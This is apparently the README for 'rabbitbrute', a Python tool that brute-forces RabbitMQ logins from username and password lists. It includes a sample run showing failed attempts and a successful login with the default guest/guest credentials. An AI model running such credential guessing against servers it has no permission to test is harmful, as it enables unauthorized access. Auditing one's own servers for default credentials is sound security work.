rabbitbrute
===========

Simple brute-force module for RabbitMQ servers. Currently takes user and password list from /tmp directory (see source).

Example:


laptop:rabbitbrute myles$ python rabbitbrute.py

[-] Connection refused: test : password
[-] Connection refused: test : secret
[-] Connection refused: test : guest
[-] Connection refused: guest : password
[-] Connection refused: guest : secret
[+] Success. User: guest --- Password: guest
[-] Connection refused: admin : password
[-] Connection refused: admin : secret
[-] Connection refused: admin : guest
[-] Connection refused: myles : password
[-] Connection refused: myles : secret
[-] Connection refused: myles : guest
[-] Connection refused: user : password
[-] Connection refused: user : secret
[-] Connection refused: user : guest
[-] Connection refused: system : password
[-] Connection refused: system : secret
[-] Connection refused: system : guest
[+] Brute force finished
laptop:rabbitbrute myles$ 
